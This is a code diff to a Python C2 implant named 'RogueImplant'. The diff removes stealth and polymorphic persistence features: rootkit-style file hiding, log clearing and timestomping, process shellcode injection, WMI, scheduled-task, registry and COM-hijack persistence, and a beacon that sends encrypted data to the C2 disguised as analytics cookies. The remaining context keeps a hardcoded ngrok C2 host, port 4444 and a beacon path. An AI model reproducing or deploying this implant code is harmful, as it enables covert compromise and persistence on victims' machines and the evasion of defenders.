@@ -28,36 +28,6 @@ import ctypes.wintypes
 from typing import Dict, Any, Optional, List
 from datetime import datetime
 
-# Stealth persistence
-try:
-    sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
-    from stealth_persistence import (
-        RootkitHider, 
-        PersistenceManager, 
-        AntiForensics,
-        GuardianProcess,
-        StealthImplant
-    )
-    STEALTH_AVAILABLE = True
-except ImportError as e:
-    STEALTH_AVAILABLE = False
-    print(f"[!] Stealth persistence module not available: {e}")
-# Polymorphic undetectable persistence
-try:
-    sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))
-    from polymorphic_persistence import (
-        PolymorphicGenerator,
-        MemoryOnlyExecutor,
-        ProcessInjector,
-        LOLBinPersistence,
-        RegistryPersistence,
-        COMHijacker,
-        ShimPersistence
-    )
-    POLYMORPHIC_AVAILABLE = True
-except ImportError as e:
-    POLYMORPHIC_AVAILABLE = False
-    print(f"[!] Polymorphic persistence module not available: {e}")
 # -------------------------------------------------------------------
 # Platform detection
 # -------------------------------------------------------------------
@@ -93,23 +63,6 @@ def _get_debug_flag() -> bool:
     return os.environ.get('ROGUE_DEBUG', '').lower() in ('1', 'true', 'yes')
 
 # Hardcoded defaults
-# Stealth persistence configuration
-# Polymorphic undetectable persistence configuration
-POLYMORPHIC_ENABLED = True
-MEMORY_ONLY_EXECUTION = True
-PROCESS_INJECTION = True
-LOLBIN_PERSISTENCE = True
-REGISTRY_PERSISTENCE = True
-COM_HIJACKING = True
-SHIM_PERSISTENCE = True
-POLYMORPHIC_EVERY_RUN = True  # Generate new polymorphic code each run
-
-STEALTH_ENABLED = True
-STEALTH_PERSISTENCE = True
-STEALTH_ANTI_FORENSICS = True
-STEALTH_GUARDIAN = True
-STEALTH_HIDING = True
-
 DEFAULT_C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
 DEFAULT_C2_PORT = 4444
 DEFAULT_BEACON_PATH = '/api/v1/telemetry'
@@ -534,100 +487,7 @@ class RogueImplant:
             
         return response
 
-    
-def stealth_beacon(c2_url: str, session_key: bytes, implant_id: str, use_stealth: bool = True):
-    """
-    Enhanced beacon with stealth features.
-    """
-    if use_stealth and STEALTH_AVAILABLE:
-        try:
-            # Use stealth implant for beaconing
-            stealth_implant = StealthImplant(
-                implant_path=__file__,
-                c2_url=c2_url,
-                implant_id=implant_id,
-                session_key=session_key.decode() if isinstance(session_key, bytes) else session_key
-            )
-            
-            # Beacon with stealth features
-            return stealth_implant.beacon()
-            
-        except Exception as e:
-            print(f"[!] Stealth beacon failed: {e}")
-            # Fall back to standard beacon
-            return beacon(c2_url, session_key, implant_id)
-    else:
-        # Use standard beacon
-        return beacon(c2_url, session_key, implant_id)
-
-def polymorphic_beacon(c2_url: str, session_key: bytes, implant_id: str, use_polymorphic: bool = True):
-    """
-    Beacon with polymorphic undetectable features.
-    """
-    if use_polymorphic and POLYMORPHIC_AVAILABLE:
-        try:
-            # Generate polymorphic beacon code
-            generator = PolymorphicGenerator()
-            
-            beacon_code = f"""
-import requests, base64, json, hashlib
-from cryptography.fernet import Fernet
-
-C2_URL = "{c2_url}"
-SESSION_KEY = b"{session_key.decode() if isinstance(session_key, bytes) else session_key}"
-IMPLANT_ID = "{implant_id}"
-
-def polymorphic_beacon_internal():
-    fernet = Fernet(SESSION_KEY)
-    
-    beacon_data = {{
-        "system_info": {{
-            "hostname": "polymorphic-host",
-            "platform": "polymorphic",
-            "polymorphic": True,
-            "memory_only": True
-        }},
-        "telemetry": {{
-            "polymorphic_seed": "{generator.seed}"
-        }}
-    }}
-    
-    json_data = json.dumps(beacon_data).encode()
-    encrypted = fernet.encrypt(json_data)
-    encoded = base64.b64encode(encrypted).decode()
-    
-    headers = {{
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Cookie": f"_ga=GA1.2.1234567890.1234567890; session={{encoded}}",
-        "Authorization": f"Bearer {{IMPLANT_ID}}",
-        "X-Polymorphic": "true",
-        "X-Memory-Only": "true"
-    }}
-    
-    try:
-        response = requests.post(f"{{C2_URL}}/api/v1/telemetry", headers=headers, data="", timeout=10)
-        return response.status_code == 200
-    except:
-        return False
-
-return polymorphic_beacon_internal()
-"""
-            
-            # Execute polymorphic beacon
-            if MemoryOnlyExecutor.execute_python_memory(beacon_code):
-                return True
-            else:
-                # Fall back to stealth beacon
-                return stealth_beacon(c2_url, session_key, implant_id, use_stealth=True)
-            
-        except Exception as e:
-            print(f"[!] Polymorphic beacon failed: {e}")
-            # Fall back to stealth beacon
-            return stealth_beacon(c2_url, session_key, implant_id, use_stealth=True)
-    else:
-        # Use stealth beacon
-        return stealth_beacon(c2_url, session_key, implant_id, use_stealth=True)
-def _transform_tasks(self, tasks: List[Dict]) -> List[Dict]:
+    def _transform_tasks(self, tasks: List[Dict]) -> List[Dict]:
         """Transform C2 tasks into safe task format."""
         commands = []
         for task in tasks:
@@ -748,98 +608,5 @@ def main():
     implant = RogueImplant()
     implant.run()
 
-
-    # -------------------------------------------------------------------
-    # STEALTH PERSISTENCE SETUP
-    # -------------------------------------------------------------------
-    if STEALTH_AVAILABLE:
-        print("[+] Stealth persistence features available")
-        
-        # Initialize stealth components
-        hider = RootkitHider()
-        persistence = PersistenceManager(__file__)
-        anti_forensics = AntiForensics()
-        
-        # Hide implant file
-        hider.hide_file(__file__)
-        
-        # Install persistence mechanisms
-        persistence_methods = persistence.install_all()
-        print(f"[+] Persistence installed: {persistence_methods}")
-        
-        # Apply anti-forensics
-        anti_forensics.timestomp(__file__)
-        anti_forensics.clean_logs()
-        
-        # Start guardian process
-        guardian = GuardianProcess(__file__, check_interval=60)
-        guardian.start()
-        
-        print("[+] Stealth persistence fully activated")
-    else:
-        print("[!] Stealth persistence not available, using standard mode")
-    
-    # -------------------------------------------------------------------
-    # POLYMORPHIC UNDETECTABLE PERSISTENCE
-    # -------------------------------------------------------------------
-    if POLYMORPHIC_AVAILABLE and POLYMORPHIC_ENABLED:
-        print("[+] Polymorphic undetectable persistence available")
-        
-        # Initialize polymorphic generator
-        generator = PolymorphicGenerator()
-        
-        # Generate polymorphic version of implant
-        with open(__file__, 'r') as f:
-            original_code = f.read()
-        
-        polymorphic_code = generator.generate_python_stub(original_code)
-        
-        # Options for execution
-        persistence_methods = []
-        
-        # 1. Memory-only execution
-        if MEMORY_ONLY_EXECUTION:
-            print("[+] Attempting memory-only execution...")
-            if MemoryOnlyExecutor.execute_python_memory(polymorphic_code):
-                persistence_methods.append("memory_only")
-                print("[+] Memory-only execution successful")
-        
-        # 2. Process injection
-        if PROCESS_INJECTION:
-            print("[+] Attempting process injection...")
-            target_pid = ProcessInjector.find_target_process()
-            if target_pid:
-                # Convert to shellcode (simplified)
-                shellcode = b"\x90" * 100  # NOP sled + actual shellcode
-                if ProcessInjector.inject_shellcode(target_pid, shellcode):
-                    persistence_methods.append(f"process_injection_{target_pid}")
-                    print(f"[+] Injected into process {target_pid}")
-        
-        # 3. LOLBin persistence
-        if LOLBIN_PERSISTENCE:
-            print("[+] Setting up LOLBin persistence...")
-            if LOLBinPersistence.install_via_wmi():
-                persistence_methods.append("wmi_event")
-            if LOLBinPersistence.install_via_schtasks():
-                persistence_methods.append("scheduled_task")
-        
-        # 4. Registry persistence
-        if REGISTRY_PERSISTENCE:
-            print("[+] Setting up registry persistence...")
-            if RegistryPersistence.store_in_registry(polymorphic_code):
-                persistence_methods.append("registry_storage")
-        
-        print(f"[+] Polymorphic persistence methods: {persistence_methods}")
-        
-        if persistence_methods:
-            print("[+] Polymorphic persistence fully activated")
-            # Exit if running in memory-only mode
-            if "memory_only" in persistence_methods and MEMORY_ONLY_EXECUTION:
-                print("[+] Running in memory-only mode, exiting original process")
-                sys.exit(0)
-        else:
-            print("[!] No polymorphic persistence methods succeeded")
-    else:
-        print("[!] Polymorphic persistence not available or disabled")
-    if __name__ == "__main__":
+if __name__ == "__main__":
     main()
